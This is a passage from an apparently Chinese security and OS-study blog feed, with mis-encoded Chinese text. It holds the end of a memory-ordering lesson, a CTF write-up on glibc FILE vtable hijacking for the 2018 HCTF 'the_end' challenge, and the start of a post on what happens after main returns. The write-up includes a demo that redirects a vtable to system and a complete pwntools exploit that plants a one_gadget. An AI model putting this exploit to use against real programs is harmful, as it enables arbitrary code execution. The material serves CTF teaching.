(!(cond)) ;</span></span><br><span class="line"></span><br><span class="line"> __attribute__((noinline))</span><br><span class="line"><span class="type">void</span> <span class="title function_">write_x_read_y</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> y_val;</span><br><span class="line">  <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(</span></span><br><span class="line"><span class="params">    <span class="string">&quot;movl $1, %0;&quot;</span> <span class="comment">// x = 1</span></span></span><br><span class="line"><span class="params">    <span class="string">&quot;movl %2, %1;&quot;</span> <span class="comment">// y_val = y</span></span></span><br><span class="line"><span class="params">    : <span class="string">&quot;=m&quot;</span>(x), <span class="string">&quot;=r&quot;</span>(y_val) : <span class="string">&quot;m&quot;</span>(y)</span></span><br><span class="line"><span class="params">  )</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, y_val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> __attribute__((noinline))</span><br><span class="line"><span class="type">void</span> <span class="title function_">write_y_read_x</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> x_val;</span><br><span class="line">  <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(</span></span><br><span class="line"><span class="params">    <span class="string">&quot;movl $1, %0;&quot;</span> <span class="comment">// y = 1</span></span></span><br><span class="line"><span class="params">    <span class="string">&quot;movl %2, %1;&quot;</span> <span class="comment">// x_val = x</span></span></span><br><span class="line"><span class="params">    : <span class="string">&quot;=m&quot;</span>(y), <span class="string">&quot;=r&quot;</span>(x_val) : <span class="string">&quot;m&quot;</span>(x)</span></span><br><span class="line"><span class="params">  )</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, x_val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">T1</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    WAIT_FOR((FLAG &amp; <span class="number">1</span>));</span><br><span class="line">    write_x_read_y();</span><br><span class="line">    FLAG_XOR(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">T2</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    WAIT_FOR((FLAG &amp; <span class="number">2</span>));</span><br><span class="line">    write_y_read_x();</span><br><span class="line">    FLAG_XOR(<span class="number">2</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Tsync</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    x = y = <span class="number">0</span>;</span><br><span class="line">    __sync_synchronize(); <span class="comment">// full barrier</span></span><br><span class="line">    usleep(<span class="number">1</span>);            <span class="comment">// + delay</span></span><br><span class="line">    assert(FLAG == <span class="number">0</span>);</span><br><span class="line">    FLAG_XOR(<span class="number">3</span>);</span><br><span class="line">    <span class="comment">// T1 and T2 clear 0/1-bit, respectively</span></span><br><span class="line">    WAIT_FOR(FLAG == <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>); fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  create(T1);</span><br><span class="line">  create(T2);</span><br><span class="line">  create(Tsync);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><ul><li><p><a href="https://en.cppreference.com/w/c/atomic">https://en.cppreference.com/w/c/atomic</a></p></li><li><p><a href="https://gcc.gnu.org/onlinedocs/gcc-12.2.0/gcc/_005f_005fatomic-Builtins.html">https://gcc.gnu.org/onlinedocs/gcc-12.2.0/gcc/_005f_005fatomic-Builtins.html</a></p></li><li><p><a href="https://gcc.gnu.org/onlinedocs/gcc-4.4.7/gcc/Atomic-Builtins.html#Atomic-Builtins">https://gcc.gnu.org/onlinedocs/gcc-4.4.7/gcc/Atomic-Builtins.html#Atomic-Builtins</a></p><p>åŸå­å˜é‡åŠåŸå­æ“ä½œæ˜¯c11å¼•å…¥ï¼Œ&lt;stdatomic.h&gt;</p><p>åŸå­å˜é‡çš„æ“ä½œæ˜¯åŸå­æ“ä½œ(atomic operation),åŸå­æ“ä½œæŒ‡çš„æ˜¯ä¸ä¼šè¢«çº¿ç¨‹è°ƒåº¦æœºåˆ¶æ‰“æ–­çš„æ“ä½œï¼Œè¿™ç§æ“ä½œä¸€æ—¦å¼€å§‹ï¼Œå°±ä¸€ç›´è¿è¡Œåˆ°ç»“æŸï¼Œåœ¨åŒä¸€ä¸ªcpuæ—¶é—´ç‰‡ä¸­å®Œæˆ,ä¸­é—´ä¸ä¼šæœ‰ä»»ä½•çš„ä¸Šä¸‹æ–‡åˆ‡æ¢ã€‚ç”¨äºå®ç°é«˜æ•ˆã€æ­£ç¡®ã€çº¿ç¨‹å®‰å…¨çš„å¹¶å‘ç¼–ç¨‹</p></li></ul></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Built-in Function: <span class="type">void</span> __atomic_load (type *ptr, type *ret, <span class="type">int</span> memorder)</span><br><span class="line">This is the generic version of an atomic load. It returns the contents of *ptr in *ret.</span><br></pre></td></tr></table></figure><p>é¦–å…ˆç”¨æ¥åŸå­å˜é‡çš„flagçš„ä½ä¸¤ä¸ªbitå½“ä½œå¼€å…³</p><p>åˆå§‹æ—¶ä¸º00ï¼Œæœ€ä½bitä¸º1æ—¶T1æ‰“å¼€ï¼Œå€’äºŒbitä¸º1æ—¶T2æ‰“å¼€</p><p>Tsyncæ˜¯æˆ‘ä»¬çš„æ§åˆ¶çº¿ç¨‹ä¸­<code>FLAG_XOR(3)</code>åŒæ—¶æŠŠT1T2æ‰“å¼€ï¼Œç„¶åT1T2åŒæ—¶æ‰§è¡Œï¼Œä¸ç®¡å“ªä¸€ä¸ªçº¿ç¨‹å¿«ä¸€ç‚¹æ…¢ä¸€ç‚¹ï¼Œå¾—åˆ°çš„ç»“æœåªèƒ½æ˜¯01 10 11ï¼Œæ‰§è¡Œè¿‡åä¼šæŠŠè‡ªå·±å¯¹åº”çš„å¼€å…³ç½®é›¶å…³é—­</p><p>æ ¹æ®è¯¥ç¨‹åºçš„çŠ¶æ€æœºæ¨¡å‹æ˜¯ä¸å¯èƒ½å‡ºç°00çš„ï¼Œä½†æ˜¯</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/N/p3&gt; gcc -O2 -g -o mem-ordering mem-ordering.c</span><br><span class="line">grxer@grxer ~/D/s/N/p3&gt; ./mem-ordering | head -n <span class="number">10000</span> |sort| uniq -c</span><br><span class="line">   <span class="number">7970</span> <span class="number">0</span> <span class="number">0</span> </span><br><span class="line">   <span class="number">1756</span> <span class="number">0</span> <span class="number">1</span> </span><br><span class="line">    <span class="number">274</span> <span class="number">1</span> <span class="number">0</span> </span><br><span class="line"><span class="meta">#head -n å–å‰nè¡Œ sortæ’åºå uniqå‘½ä»¤ç”¨äºæ£€æŸ¥åŠåˆ é™¤æ–‡æœ¬æ–‡ä»¶ä¸­é‡å¤å‡ºç°çš„è¡Œåˆ— -cç»Ÿè®¡è¯¥è¡Œé‡å¤å‡ºç°çš„æ¬¡æ•°</span></span><br></pre></td></tr></table></figure><p>å¯¼è‡´è¿™æ–¹é¢çš„åŸå› æ¥è‡ªå¤šæ ¸å¤„ç†å™¨çš„å¾®æ¶æ„  <a href="https://www.bilibili.com/video/BV1844y1z7Dx">https://www.bilibili.com/video/BV1844y1z7Dx</a></p><p>ä¸ºäº†å®ç°æµæ°´çº¿ï¼Œéœ€è¦ä¸€æ¡æŒ‡ä»¤æ‹†åˆ†ä¸ºæ›´å°çš„å¯æ‰§è¡Œå•å…ƒï¼Œå«åšmicro-operationsç®€ç§°uOpsï¼Œåˆ©ç”¨å¯„å­˜å™¨é‡å‘½åå’Œåˆ†æ”¯ç›®æ ‡é¢„æµ‹çš„æŠ€æœ¯ï¼Œå®ç°è¶…æ ‡é‡ä¹±åºæ‰§è¡Œã€‚</p><p>åœ¨ä»£ç çº§ä¸Šï¼Œçœ‹ä¸Šå»ä¼¼ä¹æ˜¯ä¸€æ¬¡æ‰§è¡Œä¸€æ¡æŒ‡ä»¤ï¼Œä½†æ˜¯å®é™…ä¸Šæ˜¯æŒ‡ä»¤çº§å¹¶è¡Œï¼Œå‘ˆç°å‡ºä¸€ç§ç®€å•çš„é¡ºåºæ‰§è¡ŒæŒ‡ä»¤çš„è¡¨è±¡ã€‚æ­£å¥½èƒ½è·å¾—æœºå™¨çº§ç¨‹åºè¦æ±‚çš„é¡ºåºè¯­ä¹‰æ¨¡å‹çš„æ•ˆæœã€‚</p><p>å…·ä½“åˆ°æˆ‘ä»¬ä¸Šé¢çš„ç¨‹åº</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">     # &lt;-----------+</span><br><span class="line">movl $<span class="number">1</span>, (x)   #   |</span><br><span class="line">movl (y), %eax # --+</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬FLAG_XOR(3)åï¼Œåœ¨å¤šå¤„ç†å™¨ç³»ç»Ÿä¸­ï¼Œå½“ä¸€ä¸ªCPUå¯¹å…±äº«å†…å­˜è¿›è¡Œä¿®æ”¹æ—¶ï¼Œéœ€è¦ä½¿å…¶ä»–CPUä¸­çš„ç¼“å­˜æ— æ•ˆï¼Œå¯¼è‡´<code>movl $1, %0;</code>å‡ ä¹æ€»æ˜¯cache missçš„ï¼Œcpuåœ¨æ‰¾å†…å­˜åŒæ—¶æ‰§è¡Œä¸‹ä¸€æ¡å’Œä¸Šä¸€æ¡æ— å…³çš„æŒ‡ä»¤ï¼Œå¯¼è‡´äº†è¾“å‡º0</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;movl $1, %0;&quot;</span> <span class="comment">// y = 1    </span></span><br><span class="line"><span class="string">&quot;movl %2, %1;&quot;</span> <span class="comment">// x_val = x</span></span><br><span class="line">: <span class="string">&quot;=m&quot;</span>(y), <span class="string">&quot;=r&quot;</span>(x_val) : <span class="string">&quot;m&quot;</span>(x)</span><br></pre></td></tr></table></figure><p><strong>å®ç°ä¸€è‡´æ€§</strong></p><ul><li><p>Memory barrier:<a href="https://gcc.gnu.org/onlinedocs/gcc/_005f_005fsync-Builtins.html">__sync_synchronize()</a></p><blockquote><p><a href="https://zhuanlan.zhihu.com/p/41872203">å¥½æ–‡</a></p><p>Built-in Function: <em>void</em> <strong>__sync_synchronize</strong> <em>(â€¦)</em></p><p>This built-in function issues a full memory barrier.</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> __sync_synchronize (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* This issues the &quot;mfence&quot; instruction on x86/x86_64.  */</span></span><br><span class="line">  __asm__ __volatile__ (<span class="string">&quot;mfence&quot;</span> : : : <span class="string">&quot;memory&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¹‹å‰åœ¨è§£å†³é¡ºåºæ€§ï¼Œç”¨åˆ°çš„asm volatile (â€œâ€ ::: â€œmemoryâ€)å¼•å¯¼ç¼–è¯‘å™¨ï¼Œè€Œæˆ‘ä»¬è¿™æ¬¡éœ€è¦å’Œç¡¬ä»¶è¿›è¡Œäº¤æµ</p><p>é˜²æ­¢è¿™ç§CPUä¹±åºï¼Œæˆ‘ä»¬éœ€è¦æ·»åŠ CPU memory fenceã€‚X86ä¸“é—¨çš„memory fenceæŒ‡ä»¤æ˜¯â€mfenceâ€ï¼›ä¿è¯å­˜è®¿é—®æ“ä½œå®Œæˆåæ‰èƒ½æ‰§è¡Œåç»­çš„å†…å­˜è®¿é—®æ“ä½œ</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;movl $1, %0;&quot;</span> <span class="comment">// x = 1</span></span><br><span class="line"><span class="string">&quot;mfence;&quot;</span></span><br><span class="line"><span class="string">&quot;movl %2, %1;&quot;</span> <span class="comment">// y_val = y</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/N/p3&gt; ./mem-ordering | head -n <span class="number">10000</span> |sort| uniq -c</span><br><span class="line">   <span class="number">1462</span> <span class="number">0</span> <span class="number">1</span> </span><br><span class="line">    <span class="number">221</span> <span class="number">1</span> <span class="number">0</span> </span><br><span class="line">   <span class="number">8317</span> <span class="number">1</span> <span class="number">1</span> </span><br></pre></td></tr></table></figure></blockquote></li><li><p>åŸå­æŒ‡ä»¤ </p><p>å’Œæˆ‘ä»¬çš„flagä¸€æ ·ç”¨åŸå­å˜é‡</p><p><code>stdatomic.h</code></p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> NJUOS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vtable Hijack--2018 HCTF the_end</title>
      <link href="/2023/04/03/vtable-hijack/"/>
      <url>/2023/04/03/vtable-hijack/</url>
      
        <content type="html"><![CDATA[<p>é€šè¿‡ä¹‹å‰çš„åˆ†æIOå‡½æ•°åŸºæœ¬ä¸Šéƒ½ä¼šå–è°ƒç”¨_IO_FILE_plus çš„vtableé‡Œçš„å‡½æ•°æŒ‡é’ˆï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥æ§åˆ¶è¿™ä¸ªæŒ‡é’ˆï¼Œå°±å¯ä»¥æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµ</p><h2 id="glibc2-23"><a href="#glibc2-23" class="headerlink" title="glibc2.23"></a>glibc2.23</h2><p>ä¸€ç§æ–¹æ³•å°±æ˜¯æ”¹vtableé‡Œçš„æŒ‡é’ˆä½†æ˜¯</p><p><img src="/2023/04/03/vtable-hijack/image-20230402114035931.png" alt="image-20230402114035931"></p><p>2.23libcé‡Œçš„_IO_file_jumpsä¸å¯å†™çš„</p><p>é‚£å°±åªèƒ½ä¼ªé€ æ•´ä¸ªä¼ªé€ _IO_FILE_plus é‡Œçš„vtableä¸ºæˆ‘ä»¬å¯å†™å¯æ§åˆ¶çš„åŒºåŸŸï¼Œæ¯”å¦‚æˆ‘ä»¬allocçš„å †</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> system_ptr 0x7ffff7a523a0;</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> *vtable_addr,*fake_vtable;</span><br><span class="line"></span><br><span class="line">    fp=fopen(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;rw&quot;</span>);</span><br><span class="line">    fake_vtable=<span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    vtable_addr=(<span class="type">long</span> <span class="type">long</span> *)((<span class="type">long</span> <span class="type">long</span>)fp+<span class="number">0xd8</span>); <span class="comment">//vtable offset</span></span><br><span class="line"></span><br><span class="line">    vtable_addr[<span class="number">0</span>]=(<span class="type">long</span> <span class="type">long</span>)fake_vtable;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(fp,<span class="string">&quot;sh&quot;</span>,<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    fake_vtable[<span class="number">7</span>]=system_ptr; <span class="comment">//xsputn</span></span><br><span class="line"></span><br><span class="line">    fwrite(<span class="string">&quot;hi&quot;</span>,<span class="number">2</span>,<span class="number">1</span>,fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fwriteå‡½æ•°ä¼šè°ƒç”¨vtableé‡Œ**__xsputn<strong>æŒ‡å‘çš„</strong>libio&#x2F;fileops.cé‡Œçš„_IO_new_file_xsputn**å‡½æ•°ï¼Œä¼ å…¥çš„å‚æ•°ä¸ºæ–‡ä»¶æµç»“æ„ä½“_IO_FILE,æ•°æ®ç›®æ ‡åœ°å€ï¼Œè¯»å–æ€»å­—èŠ‚æ•°</p><p><img src="/2023/04/03/vtable-hijack/image-20230402114847219.png" alt="image-20230402114847219"></p><p><img src="/2023/04/03/vtable-hijack/image-20230402115216810.png" alt="image-20230402115216810"></p><h2 id="2018-HCTF-the-end"><a href="#2018-HCTF-the-end" class="headerlink" title="2018 HCTF the_end"></a>2018 HCTF the_end</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/c/p/io_file&gt; checksec the_end </span><br><span class="line">[*] <span class="string">&#x27;/mnt/hgfs/Share/ctfwiki/pwn/io_file/the_end&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>ç¨‹åºæœ‰äº”ä¸ªå­—èŠ‚çš„ä»»æ„åœ°å€å†™ï¼Œæ³„éœ²äº†libcçš„åŸºåœ°å€</p><h3 id="hijack-IO-2-1-stdout-vtable-setbuf"><a href="#hijack-IO-2-1-stdout-vtable-setbuf" class="headerlink" title="hijack IO_2_1_stdout vtable _setbuf"></a>hijack <em>IO_2_1_stdout</em> vtable _setbuf</h3><p>ç¨‹åºæœ€åè°ƒç”¨äº†exitï¼Œå‰é¢å¯¹exitçš„scè§£æè°ƒç”¨ <code>exit</code> åï¼Œä¼šéå† <code>_IO_list_all</code> ï¼ŒæŒ¨ä¸ªåˆ¤æ–­stderr stdout stdin</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">for</span> (fp = (_IO_FILE *) _IO_list_all; fp; fp = fp-&gt;_chain)</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">if</span> (! (fp-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">  <span class="comment">/* Iff stream is un-orientated, it wasn&#x27;t used. */</span></span><br><span class="line">  &amp;&amp; fp-&gt;_mode != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br></pre></td></tr></table></figure><p>ifæ¡ä»¶æˆç«‹ä¼šè°ƒç”¨<code>vtable</code> ä¸­ <code>_setbuf</code> å‡½æ•°ã€‚_IO_UNBUFFEREDä¸º2</p><p><img src="/2023/04/03/vtable-hijack/image-20230403113124697.png" alt="image-20230403113124697"></p><p>åªæœ‰stdoutç¬¦åˆæ¡ä»¶ï¼Œæ‰€æœ‰æˆ‘ä»¬åŠ«æŒè¿™ä¸ª</p><p>ä¸¤ä¸ªå­—èŠ‚ä¿®æ”¹stdoutçš„vtableåˆ°ä¸€ä¸ªä¼ªé€ çš„vtableä¸Šï¼Œè¿™ä¸ªvtableçš„+0x58å¤„å¿…é¡»æ˜¯ä¸€ä¸ªlibcä¸­çš„åœ°å€ï¼Œå› ä¸ºæˆ‘ä»¬åªå‰©ä¸‹ä¸‰å­—èŠ‚èŠ‚çš„ä¿®æ”¹æƒåŠ›</p><p><img src="/2023/04/03/vtable-hijack/image-20230403121636295.png" alt="image-20230403121636295"></p><p>åˆé€‚ï¼Œæ‰€æœ‰é€‰æ‹©0x7ffff7dd1968-0x58ä½ç½®å½“ä½œvtableè·ç¦»stdin+0x30ä½ç½®</p><p>å†å¾€vtable+0x58å†™å…¥onegadgetå³å¯</p><p><img src="/2023/04/03/vtable-hijack/image-20230403125159852.png" alt="image-20230403125159852"></p><p>ç”±äºå…³é—­äº†è¾“å‡ºæµï¼Œcat flag &gt; &amp;0æˆ–exec 1&gt;&amp;0é‡å®šå‘æµ</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"><span class="title function_">context</span><span class="params">(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span></span><br><span class="line">pwnfile=<span class="string">&#x27;./the_end&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="string">&#x27;25172&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">ra = lambda: io.recvall()</span><br><span class="line">rl = lambda: io.recvline(keepends=True)</span><br><span class="line">ru = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = lambda: io.interactive()</span><br><span class="line">c = lambda: io.close()</span><br><span class="line">li = lambda x: <span class="built_in">log</span>.info(x)</span><br><span class="line">db = lambda x : gdb.attach(io,x)</span><br><span class="line">dbio= lambda : gdb.attach(io)</span><br><span class="line">uu32 = lambda x   : u32(x.ljust(<span class="number">4</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">uu64 = lambda x   : u64(x.ljust(<span class="number">8</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">p =lambda x,y:print(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + hex(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line">ru(b<span class="number">&#x27;</span>a gift <span class="string">&#x27;)</span></span><br><span class="line"><span class="string">sleep_ad=int(ru(b&#x27;</span>,<span class="string">&#x27;),16)</span></span><br><span class="line"><span class="string">p(&#x27;</span>sleep<span class="number">&#x27;</span>,sleep_ad)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;sleep&#x27;</span>,sleep_ad)</span><br><span class="line">base=sleep_ad-libc.dump(<span class="string">&#x27;sleep&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line">onegadget=base+<span class="number">0xf02b0</span></span><br><span class="line"><span class="built_in">stdin</span>=libc.dump(<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>)+base</span><br><span class="line"><span class="built_in">stdout</span>=libc.dump(<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>)+base</span><br><span class="line"><span class="meta"># gdb.attach(io)</span></span><br><span class="line"><span class="meta"># db(<span class="string">&#x27;b exit&#x27;</span>)</span></span><br><span class="line">ru(b<span class="number">&#x27;</span>\n<span class="number">&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">2</span>):</span><br><span class="line">    s(p64(<span class="built_in">stdout</span>+<span class="number">0xd8</span>+i))</span><br><span class="line">    s(p8(p64(<span class="built_in">stdin</span>+<span class="number">0x30</span>)[i]))</span><br><span class="line"><span class="meta"># dbio</span></span><br><span class="line"><span class="meta"># gdb.attach(io)</span></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">3</span>):</span><br><span class="line">    s(p64(<span class="built_in">stdin</span>+<span class="number">0x30</span>+<span class="number">0x58</span>+i))</span><br><span class="line">    s(p8(p64(onegadget)[i]))</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> IO FILE </tag>
            
            <tag> Vtable Hijack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mainå‡½æ•°è¿”å›å(After main return)</title>
      <link href="/2023/04/02/main-return/"/>
      <url>/2023/04/02/main-return/</url>
      
        <content type="html"><![CDATA[<h1 id="mainå‡½æ•°çš„return"><a href="#mainå‡½æ•°çš„return" class="headerlink" title="mainå‡½æ•°çš„return"></a>mainå‡½æ•°çš„return</h1><p>æˆ‘ä»¬å¹³æ—¶å†™ä»£ç çš„æ—¶å€™å¯èƒ½å¹¶æ²¡æœ‰æ³¨æ„åˆ°ç¼“å†²åŒºçš„é—®é¢˜ï¼Œä½†æ˜¯æˆ‘ä»¬çš„printfè¿˜æ˜¯è¾“å‡ºäº†</p><p>ä¸¾ä¸ªç®€å•ä¾‹å­</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;world&quot;</span>);</span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œèµ·æ¥ä¼šå‘ç°ç¬¬ä¸€ä¸ªprintfåœ¨æ‰§è¡Œå®Œåå¹¶æ²¡æœ‰ç«‹åˆ»è¾“å‡ºï¼Œç¬¬äºŒä¸ªprintfä¹Ÿæ²¡æœ‰ç«‹å³è¾“å‡ºï¼Œè€Œæ˜¯åœ¨6såä¸€å—è¾“å‡ºï¼Œæˆ‘ä»¬ç»è¿‡å‰é¢çš„IO FILEåˆ†æéƒ½çŸ¥é“IOæ˜¯æœ‰ç¼“å†²åŒºçš„ï¼Œä½†æ˜¯æˆ‘ä»¬å¹¶æ²¡æœ‰åˆ·æ–°ç¼“å†²åŒºè¾“å‡ºåˆ°å±å¹•ï¼Œreturnååšäº†ä»€ä¹ˆæ“ä½œå—ï¼Œä¸€åˆ‡ç­”æ¡ˆéƒ½åœ¨source codeé‡Œ</p><p>å½“æˆ‘ä»¬è¿è¡Œä¸€ä¸ªåŠ¨æ€é“¾æ¥çš„ç¨‹åºæ—¶ï¼Œæ‰§è¡Œçš„ç¬¬ä¸€æ¡æŒ‡ä»¤æ˜¯åŠ¨æ€é“¾æ¥å™¨ldå»åšåŠ¨æ€é“¾æ¥ä¹Ÿå°±æ˜¯ld-linux-x86-64.soåŠ è½½libcï¼Œåœ¨Unix-likeæ“ä½œç³»ç»Ÿä¸­ï¼Œ<code>_start</code>ç¬¦å·è¢«ä½œä¸ºç¨‹åºå…¥å£ç‚¹çš„é»˜è®¤å€¼ã€‚</p><p>_startå‡½æ•°è°ƒç”¨ç³»ç»Ÿå¯åŠ¨å‡½æ•°__libc_start_main, è¯¥å‡½æ•°å®šä¹‰åœ¨ libc.so ä¸­ã€‚å®ƒåˆå§‹åŒ–æ‰§è¡Œç¯å¢ƒï¼Œè°ƒç”¨ç”¨æˆ·å±‚çš„ main å‡½æ•°ï¼Œå¤„ç† main å‡½æ•°çš„è¿”å›å€¼ï¼Œå¹¶ä¸”åœ¨éœ€è¦çš„æ—¶å€™æŠŠæ§åˆ¶è¿”å›ç»™å†…æ ¸ã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__libc_start_main (<span class="type">int</span> (*main) (<span class="type">int</span>, <span class="type">char</span> **, <span class="type">char</span> ** MAIN_AUXVEC_DECL),</span><br><span class="line">           <span class="type">int</span> argc, <span class="type">char</span> **argv,</span><br><span class="line">           __typeof (main) init,</span><br><span class="line">           <span class="type">void</span> (*fini) (<span class="type">void</span>),</span><br><span class="line">           <span class="type">void</span> (*rtld_fini) (<span class="type">void</span>), <span class="type">void</span> *stack_end)</span><br><span class="line">&#123;</span><br><span class="line">  init_cpu_features (&amp;_dl_x86_cpu_features);</span><br><span class="line">  <span class="keyword">return</span> generic_start_main (main, argc, argv, init, fini, rtld_fini,</span><br><span class="line">                 stack_end);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>generic_start_mainé‡Œè°ƒç”¨mainæœ€åä¼šæ‰§è¡Œexitï¼Œåšç”¨æˆ·å±‚å’Œå†…æ ¸å±‚çš„é‡Šæ”¾å·¥ä½œ</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="comment">/* Nothing fancy, just call the function.  */</span></span><br><span class="line">  result = main (argc, argv, __environ MAIN_AUXVEC_PARAM);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">exit</span> (result);</span><br></pre></td></tr></table></figure><h2 id="start-hacking"><a href="#start-hacking" class="headerlink" title="_start hacking"></a>_start hacking</h2><h3 id="Compiler"><a href="#Compiler" class="headerlink" 